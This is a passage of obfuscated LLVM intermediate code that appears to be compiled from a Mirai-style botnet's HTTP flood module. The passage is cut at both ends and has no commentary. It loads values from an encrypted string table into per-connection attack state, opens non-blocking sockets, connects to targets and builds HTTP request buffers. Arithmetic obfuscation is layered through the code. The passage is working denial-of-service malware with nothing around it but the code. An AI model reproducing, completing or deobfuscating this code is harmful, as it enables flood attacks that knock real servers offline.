  call void @table_unlock_val(i8 zeroext 81)
  %383 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %384 = load i32, i32* %9, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %383, i64 %385
  %387 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %386, i32 0, i32 5
  %388 = getelementptr inbounds [512 x i8], [512 x i8]* %387, i32 0, i32 0
  %389 = call i8* @table_retrieve_val(i32 81, i32* null)
  %390 = call i32 @util_strcpy(i8* %388, i8* %389)
  call void @table_lock_val(i8 zeroext 81)
  br label %436

; <label>:391:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 82)
  %392 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %393 = load i32, i32* %9, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %392, i64 %394
  %396 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %395, i32 0, i32 5
  %397 = getelementptr inbounds [512 x i8], [512 x i8]* %396, i32 0, i32 0
  %398 = call i8* @table_retrieve_val(i32 82, i32* null)
  %399 = call i32 @util_strcpy(i8* %397, i8* %398)
  call void @table_lock_val(i8 zeroext 82)
  br label %436

; <label>:400:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 83)
  %401 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %402 = load i32, i32* %9, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %401, i64 %403
  %405 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %404, i32 0, i32 5
  %406 = getelementptr inbounds [512 x i8], [512 x i8]* %405, i32 0, i32 0
  %407 = call i8* @table_retrieve_val(i32 83, i32* null)
  %408 = call i32 @util_strcpy(i8* %406, i8* %407)
  call void @table_lock_val(i8 zeroext 83)
  br label %436

; <label>:409:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 84)
  %410 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %411 = load i32, i32* %9, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %410, i64 %412
  %414 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %413, i32 0, i32 5
  %415 = getelementptr inbounds [512 x i8], [512 x i8]* %414, i32 0, i32 0
  %416 = call i8* @table_retrieve_val(i32 84, i32* null)
  %417 = call i32 @util_strcpy(i8* %415, i8* %416)
  call void @table_lock_val(i8 zeroext 84)
  br label %436

; <label>:418:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 85)
  %419 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %420 = load i32, i32* %9, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %419, i64 %421
  %423 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %422, i32 0, i32 5
  %424 = getelementptr inbounds [512 x i8], [512 x i8]* %423, i32 0, i32 0
  %425 = call i8* @table_retrieve_val(i32 85, i32* null)
  %426 = call i32 @util_strcpy(i8* %424, i8* %425)
  call void @table_lock_val(i8 zeroext 85)
  br label %436

; <label>:427:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 86)
  %428 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %429 = load i32, i32* %9, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %428, i64 %430
  %432 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %431, i32 0, i32 5
  %433 = getelementptr inbounds [512 x i8], [512 x i8]* %432, i32 0, i32 0
  %434 = call i8* @table_retrieve_val(i32 86, i32* null)
  %435 = call i32 @util_strcpy(i8* %433, i8* %434)
  call void @table_lock_val(i8 zeroext 86)
  br label %436

; <label>:436:                                    ; preds = %427, %418, %409, %400, %391, %382, %373, %364, %355, %346, %337, %328, %319, %310, %301, %298
  %437 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %437, i64 %439
  %441 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %440, i32 0, i32 6
  %442 = getelementptr inbounds [257 x i8], [257 x i8]* %441, i32 0, i32 0
  %443 = load i8*, i8** %17, align 8
  %444 = call i32 @util_strcpy(i8* %442, i8* %443)
  br label %445

; <label>:445:                                    ; preds = %436
  %446 = load i32, i32* %9, align 4
  %447 = sub i32 0, %446
  %448 = sub i32 0, 1
  %449 = add i32 %447, %448
  %450 = sub i32 0, %449
  %451 = add nsw i32 %446, 1
  store i32 %450, i32* %9, align 4
  br label %155

; <label>:452:                                    ; preds = %155
  br label %453

; <label>:453:                                    ; preds = %2894, %1169, %1159, %452
  store i32 0, i32* %23, align 4
  %454 = call i64 @time(i64* null) #6
  %455 = trunc i64 %454 to i32
  store i32 %455, i32* %27, align 4
  br label %456

; <label>:456:                                    ; preds = %453
  %457 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %458 = getelementptr inbounds [16 x i64], [16 x i64]* %457, i64 0, i64 0
  %459 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %458) #6, !srcloc !1
  %460 = extractvalue { i64, i64* } %459, 0
  %461 = extractvalue { i64, i64* } %459, 1
  %462 = trunc i64 %460 to i32
  store i32 %462, i32* %28, align 4
  %463 = ptrtoint i64* %461 to i64
  %464 = trunc i64 %463 to i32
  store i32 %464, i32* %29, align 4
  br label %465

; <label>:465:                                    ; preds = %456
  br label %466

; <label>:466:                                    ; preds = %465
  %467 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %468 = getelementptr inbounds [16 x i64], [16 x i64]* %467, i64 0, i64 0
  %469 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %468) #6, !srcloc !2
  %470 = extractvalue { i64, i64* } %469, 0
  %471 = extractvalue { i64, i64* } %469, 1
  %472 = trunc i64 %470 to i32
  store i32 %472, i32* %30, align 4
  %473 = ptrtoint i64* %471 to i64
  %474 = trunc i64 %473 to i32
  store i32 %474, i32* %31, align 4
  br label %475

; <label>:475:                                    ; preds = %466
  store i32 0, i32* %9, align 4
  br label %476

; <label>:476:                                    ; preds = %1150, %475
  %477 = load i32, i32* %9, align 4
  %478 = load i32, i32* %18, align 4
  %479 = icmp slt i32 %477, %478
  br i1 %479, label %480, label %1156

; <label>:480:                                    ; preds = %476
  %481 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %482 = load i32, i32* %9, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %481, i64 %483
  store %struct.attack_http_state* %484, %struct.attack_http_state** %26, align 8
  %485 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %486 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %485, i32 0, i32 1
  %487 = load i8, i8* %486, align 4
  %488 = zext i8 %487 to i32
  %489 = icmp eq i32 %488, 1
  br i1 %489, label %490, label %502

; <label>:490:                                    ; preds = %480
  %491 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %492 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %491, i32 0, i32 12
  %493 = load i32, i32* %492, align 4
  %494 = icmp ne i32 %493, 0
  br i1 %494, label %495, label %498

; <label>:495:                                    ; preds = %490
  %496 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %497 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %496, i32 0, i32 1
  store i8 4, i8* %497, align 4
  br label %501

; <label>:498:                                    ; preds = %490
  %499 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %500 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %499, i32 0, i32 1
  store i8 0, i8* %500, align 4
  br label %501

; <label>:501:                                    ; preds = %498, %495
  br label %502

; <label>:502:                                    ; preds = %501, %480
  %503 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %504 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %503, i32 0, i32 1
  %505 = load i8, i8* %504, align 4
  %506 = zext i8 %505 to i32
  %507 = icmp eq i32 %506, 0
  br i1 %507, label %508, label %609

; <label>:508:                                    ; preds = %502
  %509 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* %509, i8 0, i64 16, i32 4, i1 false)
  %510 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %511 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %510, i32 0, i32 0
  %512 = load i32, i32* %511, align 4
  %513 = icmp ne i32 %512, -1
  br i1 %513, label %514, label %519

; <label>:514:                                    ; preds = %508
  %515 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %516 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %515, i32 0, i32 0
  %517 = load i32, i32* %516, align 4
  %518 = call i32 @close(i32 %517)
  br label %519

; <label>:519:                                    ; preds = %514, %508
  %520 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %521 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %522 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %521, i32 0, i32 0
  store i32 %520, i32* %522, align 4
  %523 = icmp eq i32 %520, -1
  br i1 %523, label %524, label %525

; <label>:524:                                    ; preds = %519
  br label %1150

; <label>:525:                                    ; preds = %519
  %526 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %527 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %526, i32 0, i32 0
  %528 = load i32, i32* %527, align 4
  %529 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %530 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %529, i32 0, i32 0
  %531 = load i32, i32* %530, align 4
  %532 = call i32 (i32, i32, ...) @fcntl(i32 %531, i32 3, i32 0)
  %533 = and i32 2048, %532
  %534 = xor i32 2048, %532
  %535 = or i32 %533, %534
  %536 = or i32 2048, %532
  %537 = call i32 (i32, i32, ...) @fcntl(i32 %528, i32 4, i32 %535)
  store i32 65535, i32* %10, align 4
  %538 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %539 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %538, i32 0, i32 0
  %540 = load i32, i32* %539, align 4
  %541 = bitcast i32* %10 to i8*
  %542 = call i32 @setsockopt(i32 %540, i32 0, i32 8, i8* %541, i32 4) #6
  %543 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %543, align 4
  %544 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %545 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %544, i32 0, i32 4
  %546 = load i32, i32* %545, align 4
  %547 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %548 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %547, i32 0, i32 0
  store i32 %546, i32* %548, align 4
  %549 = load i16, i16* %19, align 2
  %550 = call zeroext i16 @htons(i16 zeroext %549) #7
  %551 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %550, i16* %551, align 2
  %552 = load i32, i32* %27, align 4
  %553 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %554 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %553, i32 0, i32 2
  store i32 %552, i32* %554, align 4
  %555 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %556 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %555, i32 0, i32 1
  store i8 2, i8* %556, align 4
  %557 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %558 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %557, i32 0, i32 0
  %559 = load i32, i32* %558, align 4
  %560 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %561 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %561, %struct.sockaddr** %560, align 8
  %562 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %563 = load %struct.sockaddr*, %struct.sockaddr** %562, align 8
  %564 = call i32 @connect(i32 %559, %struct.sockaddr* %563, i32 16)
  %565 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %566 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %565, i32 0, i32 0
  %567 = load i32, i32* %566, align 4
  %568 = srem i32 %567, 64
  %569 = zext i32 %568 to i64
  %570 = shl i64 1, %569
  %571 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %572 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %573 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %572, i32 0, i32 0
  %574 = load i32, i32* %573, align 4
  %575 = sdiv i32 %574, 64
  %576 = sext i32 %575 to i64
  %577 = getelementptr inbounds [16 x i64], [16 x i64]* %571, i64 0, i64 %576
  %578 = load i64, i64* %577, align 8
  %579 = xor i64 %578, -1
  %580 = xor i64 %570, -1
  %581 = xor i64 -6584518618740635964, -1
  %582 = and i64 %579, -6584518618740635964
  %583 = and i64 %578, %581
  %584 = and i64 %580, -6584518618740635964
  %585 = and i64 %570, %581
  %586 = or i64 %582, %583
  %587 = or i64 %584, %585
  %588 = xor i64 %586, %587
  %589 = or i64 %579, %580
  %590 = xor i64 %589, -1
  %591 = or i64 -6584518618740635964, %581
  %592 = and i64 %590, %591
  %593 = or i64 %588, %592
  %594 = or i64 %578, %570
  store i64 %593, i64* %577, align 8
  %595 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %596 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %595, i32 0, i32 0
  %597 = load i32, i32* %596, align 4
  %598 = load i32, i32* %23, align 4
  %599 = icmp sgt i32 %597, %598
  br i1 %599, label %600, label %608

; <label>:600:                                    ; preds = %525
  %601 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %602 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %601, i32 0, i32 0
  %603 = load i32, i32* %602, align 4
  %604 = add i32 %603, 2019217181
  %605 = add i32 %604, 1
  %606 = sub i32 %605, 2019217181
  %607 = add nsw i32 %603, 1
  store i32 %606, i32* %23, align 4
  br label %608

; <label>:608:                                    ; preds = %600, %525
  br label %1149

; <label>:609:                                    ; preds = %502
  %610 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %611 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %610, i32 0, i32 1
  %612 = load i8, i8* %611, align 4
  %613 = zext i8 %612 to i32
  %614 = icmp eq i32 %613, 2
  br i1 %614, label %615, label %679

; <label>:615:                                    ; preds = %609
  %616 = load i32, i32* %27, align 4
  %617 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %618 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %617, i32 0, i32 2
  %619 = load i32, i32* %618, align 4
  %620 = sub i32 %616, 790694351
  %621 = sub i32 %620, %619
  %622 = add i32 %621, 790694351
  %623 = sub i32 %616, %619
  %624 = icmp ugt i32 %622, 30
  br i1 %624, label %625, label %634

; <label>:625:                                    ; preds = %615
  %626 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %627 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %626, i32 0, i32 1
  store i8 0, i8* %627, align 4
  %628 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %629 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %628, i32 0, i32 0
  %630 = load i32, i32* %629, align 4
  %631 = call i32 @close(i32 %630)
  %632 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %633 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %632, i32 0, i32 0
  store i32 -1, i32* %633, align 4
  br label %1150

; <label>:634:                                    ; preds = %615
  %635 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %636 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %635, i32 0, i32 0
  %637 = load i32, i32* %636, align 4
  %638 = srem i32 %637, 64
  %639 = zext i32 %638 to i64
  %640 = shl i64 1, %639
  %641 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %642 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %643 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %642, i32 0, i32 0
  %644 = load i32, i32* %643, align 4
  %645 = sdiv i32 %644, 64
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds [16 x i64], [16 x i64]* %641, i64 0, i64 %646
  %648 = load i64, i64* %647, align 8
  %649 = xor i64 %648, -1
  %650 = xor i64 %640, -1
  %651 = xor i64 -3755789334747451624, -1
  %652 = and i64 %649, -3755789334747451624
  %653 = and i64 %648, %651
  %654 = and i64 %650, -3755789334747451624
  %655 = and i64 %640, %651
  %656 = or i64 %652, %653
  %657 = or i64 %654, %655
  %658 = xor i64 %656, %657
  %659 = or i64 %649, %650
  %660 = xor i64 %659, -1
  %661 = or i64 -3755789334747451624, %651
  %662 = and i64 %660, %661
  %663 = or i64 %658, %662
  %664 = or i64 %648, %640
  store i64 %663, i64* %647, align 8
  %665 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %666 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %665, i32 0, i32 0
  %667 = load i32, i32* %666, align 4
  %668 = load i32, i32* %23, align 4
  %669 = icmp sgt i32 %667, %668
  br i1 %669, label %670, label %678

; <label>:670:                                    ; preds = %634
  %671 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %672 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %671, i32 0, i32 0
  %673 = load i32, i32* %672, align 4
  %674 = add i32 %673, -837013685
  %675 = add i32 %674, 1
  %676 = sub i32 %675, -837013685
  %677 = add nsw i32 %673, 1
  store i32 %676, i32* %23, align 4
  br label %678

; <label>:678:                                    ; preds = %670, %634
  br label %1148

; <label>:679:                                    ; preds = %609
  %680 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %681 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %680, i32 0, i32 1
  %682 = load i8, i8* %681, align 4
  %683 = zext i8 %682 to i32
  %684 = icmp eq i32 %683, 4
  br i1 %684, label %685, label %967

; <label>:685:                                    ; preds = %679
  %686 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %687 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %686, i32 0, i32 14
  store i32 -1, i32* %687, align 4
  %688 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %689 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %688, i32 0, i32 11
  store i32 0, i32* %689, align 4
  %690 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %691 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %690, i32 0, i32 18
  %692 = getelementptr inbounds [1024 x i8], [1024 x i8]* %691, i32 0, i32 0
  call void @util_zero(i8* %692, i32 1024)
  %693 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %694 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %693, i32 0, i32 17
  store i32 0, i32* %694, align 4
  %695 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  call void @util_zero(i8* %695, i32 10240)
  %696 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %697 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %698 = call i32 @util_strlen(i8* %697)
  %699 = sext i32 %698 to i64
  %700 = getelementptr inbounds i8, i8* %696, i64 %699
  %701 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %702 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %701, i32 0, i32 9
  %703 = getelementptr inbounds [9 x i8], [9 x i8]* %702, i32 0, i32 0
  %704 = call i32 @util_strcpy(i8* %700, i8* %703)
  %705 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %706 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %707 = call i32 @util_strlen(i8* %706)
  %708 = sext i32 %707 to i64
  %709 = getelementptr inbounds i8, i8* %705, i64 %708
  %710 = call i32 @util_strcpy(i8* %709, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %711 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %712 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %713 = call i32 @util_strlen(i8* %712)
  %714 = sext i32 %713 to i64
  %715 = getelementptr inbounds i8, i8* %711, i64 %714
  %716 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %717 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %716, i32 0, i32 6
  %718 = getelementptr inbounds [257 x i8], [257 x i8]* %717, i32 0, i32 0
  %719 = call i32 @util_strcpy(i8* %715, i8* %718)
  %720 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %721 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %722 = call i32 @util_strlen(i8* %721)
  %723 = sext i32 %722 to i64
  %724 = getelementptr inbounds i8, i8* %720, i64 %723
  %725 = call i32 @util_strcpy(i8* %724, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %726 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %727 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %728 = call i32 @util_strlen(i8* %727)
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds i8, i8* %726, i64 %729
  %731 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %732 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %731, i32 0, i32 5
  %733 = getelementptr inbounds [512 x i8], [512 x i8]* %732, i32 0, i32 0
  %734 = call i32 @util_strcpy(i8* %730, i8* %733)
  %735 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %736 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %737 = call i32 @util_strlen(i8* %736)
  %738 = sext i32 %737 to i64
  %739 = getelementptr inbounds i8, i8* %735, i64 %738
  %740 = call i32 @util_strcpy(i8* %739, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %741 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %742 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %743 = call i32 @util_strlen(i8* %742)
  %744 = sext i32 %743 to i64
  %745 = getelementptr inbounds i8, i8* %741, i64 %744
  %746 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %747 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %746, i32 0, i32 7
  %748 = getelementptr inbounds [129 x i8], [129 x i8]* %747, i32 0, i32 0
  %749 = call i32 @util_strcpy(i8* %745, i8* %748)
  %750 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %751 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %752 = call i32 @util_strlen(i8* %751)
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds i8, i8* %750, i64 %753
  %755 = call i32 @util_strcpy(i8* %754, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 57)
  %756 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %757 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %758 = call i32 @util_strlen(i8* %757)
  %759 = sext i32 %758 to i64
  %760 = getelementptr inbounds i8, i8* %756, i64 %759
  %761 = call i8* @table_retrieve_val(i32 57, i32* null)
  %762 = call i32 @util_strcpy(i8* %760, i8* %761)
  call void @table_lock_val(i8 zeroext 57)
  %763 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %764 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %765 = call i32 @util_strlen(i8* %764)
  %766 = sext i32 %765 to i64
  %767 = getelementptr inbounds i8, i8* %763, i64 %766
  %768 = call i32 @util_strcpy(i8* %767, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 58)
  %769 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %770 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %771 = call i32 @util_strlen(i8* %770)
  %772 = sext i32 %771 to i64
  %773 = getelementptr inbounds i8, i8* %769, i64 %772
  %774 = call i8* @table_retrieve_val(i32 58, i32* null)
  %775 = call i32 @util_strcpy(i8* %773, i8* %774)
  call void @table_lock_val(i8 zeroext 58)
  %776 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %777 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %778 = call i32 @util_strlen(i8* %777)
  %779 = sext i32 %778 to i64
  %780 = getelementptr inbounds i8, i8* %776, i64 %779
  %781 = call i32 @util_strcpy(i8* %780, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 59)
  %782 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %783 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %784 = call i32 @util_strlen(i8* %783)
  %785 = sext i32 %784 to i64
  %786 = getelementptr inbounds i8, i8* %782, i64 %785
  %787 = call i8* @table_retrieve_val(i32 59, i32* null)
  %788 = call i32 @util_strcpy(i8* %786, i8* %787)
  call void @table_lock_val(i8 zeroext 59)
  %789 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %790 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %791 = call i32 @util_strlen(i8* %790)
  %792 = sext i32 %791 to i64
  %793 = getelementptr inbounds i8, i8* %789, i64 %792
  %794 = call i32 @util_strcpy(i8* %793, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %795 = load i8*, i8** %14, align 8
  %796 = icmp ne i8* %795, null
  br i1 %796, label %797, label %838

; <label>:797:                                    ; preds = %685
  call void @table_unlock_val(i8 zeroext 60)
  %798 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %799 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %800 = call i32 @util_strlen(i8* %799)
  %801 = sext i32 %800 to i64
  %802 = getelementptr inbounds i8, i8* %798, i64 %801
  %803 = call i8* @table_retrieve_val(i32 60, i32* null)
  %804 = call i32 @util_strcpy(i8* %802, i8* %803)
  call void @table_lock_val(i8 zeroext 60)
  %805 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %806 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %807 = call i32 @util_strlen(i8* %806)
  %808 = sext i32 %807 to i64
  %809 = getelementptr inbounds i8, i8* %805, i64 %808
  %810 = call i32 @util_strcpy(i8* %809, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %811 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %812 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %813 = call i32 @util_strlen(i8* %812)
  %814 = sext i32 %813 to i64
  %815 = getelementptr inbounds i8, i8* %811, i64 %814
  %816 = call i8* @table_retrieve_val(i32 65, i32* null)
  %817 = call i32 @util_strcpy(i8* %815, i8* %816)
  %818 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %819 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %820 = call i32 @util_strlen(i8* %819)
  %821 = sext i32 %820 to i64
  %822 = getelementptr inbounds i8, i8* %818, i64 %821
  %823 = call i32 @util_strcpy(i8* %822, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %824 = load i8*, i8** %14, align 8
  %825 = call i32 @util_strlen(i8* %824)
  %826 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %827 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %828 = call i32 @util_strlen(i8* %827)
